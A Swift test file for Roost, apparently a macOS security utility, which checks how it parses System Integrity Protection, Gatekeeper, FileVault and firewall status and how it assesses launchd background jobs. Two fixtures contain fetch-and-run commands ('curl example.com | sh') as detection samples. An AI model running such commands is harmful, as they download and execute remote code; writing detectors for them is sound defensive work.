//
//  protection-test.swift
//
//  Exercises how Roost reads macOS's own protections, and what it says about
//  launchd jobs.
//
//  Run:  cat Roost/UI/Localized.swift Roost/System/Protection.swift \
//            Roost/System/BackgroundItems.swift Tools/protection-test.swift | swift -
//
//  The tools' outputs below are copied from the Mac this was written on, plus
//  the variants each tool prints in its other states. The rule every parser
//  is held to is the same: words it does not know are `unknown`, never `on`.
//  A protection reported as on when it is off is the one answer here that
//  does harm.
//
import Foundation

setvbuf(stdout, nil, _IONBF, 0)

var failures = 0
func check(_ name: String, _ ok: Bool) {
    print(ok ? "  ok   \(name)" : "  FAIL \(name)")
    if !ok { failures += 1 }
}

print("System Integrity Protection")
check("enabled", Protection.parseSIP("System Integrity Protection status: enabled.\n") == .on)
check("disabled", Protection.parseSIP("System Integrity Protection status: disabled.\n") == .off)
check("a custom configuration is off -- some of it is", Protection.parseSIP("""
System Integrity Protection status: unknown (Custom Configuration).

Configuration:
	Apple Internal: disabled
	Kext Signing: disabled
""") == .off)
check("nothing is unknown", Protection.parseSIP("") == .unknown)
check("an error is unknown", Protection.parseSIP("csrutil: failed to read") == .unknown)

print("Gatekeeper")
check("enabled", Protection.parseGatekeeper("assessments enabled\n") == .on)
check("disabled", Protection.parseGatekeeper("assessments disabled\n") == .off)
check("nothing is unknown", Protection.parseGatekeeper("") == .unknown)

print("FileVault")
check("on", Protection.parseFileVault("FileVault is On.\n") == .on)
check("off", Protection.parseFileVault("FileVault is Off.\n") == .off)
check("encrypting counts as on", Protection.parseFileVault(
    "FileVault is On.\nEncryption in progress: Percent completed = 41.2\n") == .on)
// Decryption prints "FileVault is On." too; the direction it is going wins.
check("decrypting counts as off", Protection.parseFileVault(
    "FileVault is On.\nDecryption in progress: Percent completed = 12.0\n") == .off)
check("nothing is unknown", Protection.parseFileVault("") == .unknown)

print("Firewall")
check("off", Protection.parseFirewall("Firewall is disabled. (State = 0)\n") == .off)
check("on", Protection.parseFirewall("Firewall is enabled. (State = 1)\n") == .on)
check("blocking everything is on", Protection.parseFirewall("Firewall is blocking all non-essential incoming connections. (State = 2)\n") == .on)
check("a state it does not know is unknown", Protection.parseFirewall("(State = 7)") == .unknown)
check("words without the number", Protection.parseFirewall("Firewall is enabled.") == .on)
check("nothing is unknown", Protection.parseFirewall("") == .unknown)

print("Security responses")
// Measured: both keys absent on a Mac where nobody touched the switch.
check("absent is the default, which is on",
      Protection.securityUpdates(configData: nil, critical: nil) == .defaultOn)
check("both on is on", Protection.securityUpdates(configData: true, critical: true) == .on)
check("either off is off", Protection.securityUpdates(configData: false, critical: true) == .off)
check("the other off is off", Protection.securityUpdates(configData: nil, critical: false) == .off)

print("The report")
let report = Protection.Report(states: [.sip: .on, .gatekeeper: .off, .fileVault: .off,
                                        .firewall: .off, .securityUpdates: .defaultOn], xprotect: nil)
check("essential protections that are off are listed in order",
      report.essentialOff == [.gatekeeper, .fileVault])
check("an off firewall is not essential", !report.essentialOff.contains(.firewall))
let live = Protection.read()
check("every check gets an answer on this Mac", live.states.count == Protection.Check.allCases.count)
check("and none of them is unknown here", !live.states.values.contains(.unknown))
check("XProtect's version is read", !(live.xprotect?.version ?? "").isEmpty)

// MARK: - Background items

print("launchd plists")
let url = URL(fileURLWithPath: "/Library/LaunchAgents/com.maker.agent.plist")
func job(_ plist: [String: Any]) -> BackgroundItems.Job? {
    BackgroundItems.parse(plist, at: url, domain: .allUsers)
}
check("no label is not a job", job(["Program": "/bin/true"]) == nil)
check("an empty label is not a job", job(["Label": ""]) == nil)
let basic = job(["Label": "com.maker.agent", "ProgramArguments": ["/usr/local/bin/agent", "--quiet"],
                 "RunAtLoad": true])
check("the program is the first argument", basic?.program == "/usr/local/bin/agent")
check("RunAtLoad is read", basic?.runsAtLoad == true)
check("absent KeepAlive is false", basic?.keepsAlive == false)
check("Program wins over ProgramArguments",
      job(["Label": "x", "Program": "/a", "ProgramArguments": ["/b"]])?.program == "/a")
check("KeepAlive as a bool", job(["Label": "x", "KeepAlive": true])?.keepsAlive == true)
check("KeepAlive as conditions", job(["Label": "x", "KeepAlive": ["NetworkState": true]])?.keepsAlive == true)
check("KeepAlive as an empty dictionary", job(["Label": "x", "KeepAlive": [String: Any]()])?.keepsAlive == false)
check("one associated bundle", job(["Label": "x", "AssociatedBundleIdentifiers": "com.a.b"])?
        .associatedBundleIDs == ["com.a.b"])
check("several associated bundles", job(["Label": "x", "AssociatedBundleIdentifiers": ["com.a.b", "com.a.c"]])?
        .associatedBundleIDs == ["com.a.b", "com.a.c"])
check("Disabled is read", job(["Label": "x", "Disabled": true])?.disabledInPlist == true)

print("What a job runs")
let app = URL(fileURLWithPath: "/Applications/Maker.app")
let bundled = job(["Label": "x", "BundleProgram": "Contents/Library/LoginItems/Helper",
                   "AssociatedBundleIdentifiers": "com.maker.app"])!
check("a BundleProgram is inside its app",
      BackgroundItems.executable(of: bundled, appURL: { $0 == "com.maker.app" ? app : nil })?.path
        == "/Applications/Maker.app/Contents/Library/LoginItems/Helper")
check("with its app gone there is nothing to run",
      BackgroundItems.executable(of: bundled, appURL: { _ in nil }) == nil)
// Found in review: launchd resolves a bare name through _PATH_STDPATH, and
// a working `sh -c` job was being reported as missing its program.
check("a bare name is looked up where launchd looks",
      BackgroundItems.executable(of: job(["Label": "x", "ProgramArguments": ["sh", "-c", "true"]])!,
                                 appURL: { _ in nil })?.path == "/bin/sh")
check("a bare name found nowhere is missing",
      BackgroundItems.executable(of: job(["Label": "x", "Program": "no-such-tool-\(UUID().uuidString)"])!,
                                 appURL: { _ in nil }) == nil)
check("a relative path with a folder is not guessed at",
      BackgroundItems.executable(of: job(["Label": "x", "Program": "bin/agent"])!, appURL: { _ in nil }) == nil)
let bareShell2 = BackgroundItems.assess(job(["Label": "x", "ProgramArguments": ["sh", "-c", "curl x | sh"]])!,
                                        appURL: { _ in nil })
check("and its script is then seen", bareShell2.concerns == [.runsScript])

print("Signatures")
check("/bin/sh is Apple's", BackgroundItems.signature(of: URL(fileURLWithPath: "/bin/sh")) == .apple)
check("a missing file is missing",
      BackgroundItems.signature(of: URL(fileURLWithPath: "/nonexistent/\(UUID().uuidString)")) == .missing)
let scratch = FileManager.default.temporaryDirectory.appendingPathComponent("unsigned-\(UUID().uuidString)")
FileManager.default.createFile(atPath: scratch.path, contents: Data("#!/bin/sh\necho hi\n".utf8))
check("a script is unsigned", BackgroundItems.signature(of: scratch) == .unsigned)
try? FileManager.default.removeItem(at: scratch)
// A program behind a folder this user cannot enter is not missing, and must
// never be offered for the Bin as though it were.
let closed = FileManager.default.temporaryDirectory.appendingPathComponent("closed-\(UUID().uuidString)")
try? FileManager.default.createDirectory(at: closed, withIntermediateDirectories: true)
let hidden = closed.appendingPathComponent("tool")
FileManager.default.createFile(atPath: hidden.path, contents: Data("#!/bin/sh\n".utf8))
chmod(closed.path, 0o000)
check("a program in a closed folder is not absent", !BackgroundItems.isAbsent(hidden.path))
check("and is unreadable, not missing", BackgroundItems.signature(of: hidden) == .unreadable)
check("a path that is not there is absent", BackgroundItems.isAbsent("/nonexistent/\(UUID().uuidString)"))
chmod(closed.path, 0o755)
try? FileManager.default.removeItem(at: closed)
// Through a symlink, as Homebrew installs everything: refused outright
// until the path was resolved first.
let shell = FileManager.default.temporaryDirectory.appendingPathComponent("sh-link-\(UUID().uuidString)")
try? FileManager.default.createSymbolicLink(at: shell, withDestinationURL: URL(fileURLWithPath: "/bin/sh"))
check("a symlink is checked as what it points at", BackgroundItems.signature(of: shell) == .apple)
try? FileManager.default.removeItem(at: shell)

print("Concerns")
let plain = job(["Label": "x", "Program": "/usr/local/bin/agent"])!
check("a missing program is said", BackgroundItems.concerns(plain, signature: .missing) == [.programMissing])
check("an unsigned program is said", BackgroundItems.concerns(plain, signature: .unsigned) == [.unsigned])
check("a broken signature is said", BackgroundItems.concerns(plain, signature: .broken) == [.brokenSignature])
check("a developer's program is not a concern",
      BackgroundItems.concerns(plain, signature: .developer(team: "ABCDE12345")).isEmpty)
check("an ad hoc build is not a concern -- Homebrew's look like this",
      BackgroundItems.concerns(plain, signature: .adHoc).isEmpty)
let script = job(["Label": "x", "ProgramArguments": ["/bin/sh", "-c", "curl example.com | sh"]])!
check("a shell handed a script is said: its signature covers the shell, not the script",
      BackgroundItems.concerns(script, signature: .apple) == [.runsScript])
let bareShell = job(["Label": "x", "ProgramArguments": ["/bin/sh"]])!
check("a shell with nothing to run is not", BackgroundItems.concerns(bareShell, signature: .apple).isEmpty)
let appleTool = job(["Label": "x", "Program": "/usr/libexec/sometool"])!
check("an Apple tool is not a concern", BackgroundItems.concerns(appleTool, signature: .apple).isEmpty)

print("Read again before acting")
let plistURL = FileManager.default.temporaryDirectory.appendingPathComponent("job-\(UUID().uuidString).plist")
func writePlist(_ dict: [String: Any]) {
    let data = try? PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
    try? data?.write(to: plistURL)
}
writePlist(["Label": "com.maker.agent", "Program": "/nonexistent/\(UUID().uuidString)"])
check("a job pointing at nothing is missing",
      BackgroundItems.reassess(plistURL, domain: .user, appURL: { _ in nil })?.signature == .missing)
// An updater rewrites the plist between the list and the button.
writePlist(["Label": "com.maker.agent", "Program": "/bin/sh", "ProgramArguments": ["/bin/sh"]])
check("rewritten to point at a program that is there, it is no longer missing",
      BackgroundItems.reassess(plistURL, domain: .user, appURL: { _ in nil })?.signature == .apple)
try? FileManager.default.removeItem(at: plistURL)
check("a plist that has gone is nothing to act on",
      BackgroundItems.reassess(plistURL, domain: .user, appURL: { _ in nil }) == nil)

print("What a row is called")
check("the developer's name comes out of a Developer ID summary",
      BackgroundItems.signer(fromSummary: "Developer ID Application: Google LLC (EQHXZ8M8AV)") == "Google LLC")
check("a name with brackets of its own keeps them",
      BackgroundItems.signer(fromSummary: "Developer ID Application: Foo (UK) Ltd (ABCDE12345)") == "Foo (UK) Ltd")
check("a summary in no known shape is used as it is",
      BackgroundItems.signer(fromSummary: "Some Signer") == "Some Signer")
check("an empty summary is no name", BackgroundItems.signer(fromSummary: "Developer ID Application:  ") == nil)
check("a helper inside an app belongs to the outer app",
      BackgroundItems.owningApp(of: URL(fileURLWithPath:
        "/Applications/Foo.app/Contents/Library/LoginItems/FooHelper.app/Contents/MacOS/FooHelper"))?.path
        == "/Applications/Foo.app")
check("a helper app outside /Applications is its own",
      BackgroundItems.owningApp(of: URL(fileURLWithPath:
        "/Library/PrivilegedHelperTools/Host.app/Contents/MacOS/host_service"))?.path
        == "/Library/PrivilegedHelperTools/Host.app")
check("a bare tool belongs to no app",
      BackgroundItems.owningApp(of: URL(fileURLWithPath: "/opt/orbit/bin/orbit")) == nil)
let tool = BackgroundItems.assess(job(["Label": "com.maker.tool", "Program": "/bin/sh"])!, appURL: { _ in nil })
check("a bare tool is called by its file name", BackgroundItems.title(of: tool) == "sh")
let named = BackgroundItems.assess(job(["Label": "com.maker.helper", "BundleProgram": "Contents/MacOS/helper",
                                        "AssociatedBundleIdentifiers": "com.maker.app"])!,
                                   appURL: { $0 == "com.maker.app" ? URL(fileURLWithPath: "/Applications/Maker.app") : nil })
check("a job that names its app is called by the app", BackgroundItems.title(of: named) == "Maker")
let nameless = BackgroundItems.assess(job(["Label": "com.maker.ghost"])!, appURL: { _ in nil })
check("a job with no program is called by its label", BackgroundItems.title(of: nameless) == "com.maker.ghost")

print("This Mac")
let jobs = BackgroundItems.jobs(home: FileManager.default.homeDirectoryForCurrentUser)
check("the three folders can be listed without permission", jobs.allSatisfy { !$0.label.isEmpty })
check("each folder's jobs come together, user first",
      jobs.map(\.domain.rawValue) == jobs.map(\.domain.rawValue).sorted())

print(failures == 0 ? "\nall passed" : "\n\(failures) failed")
exit(failures == 0 ? 0 : 1)
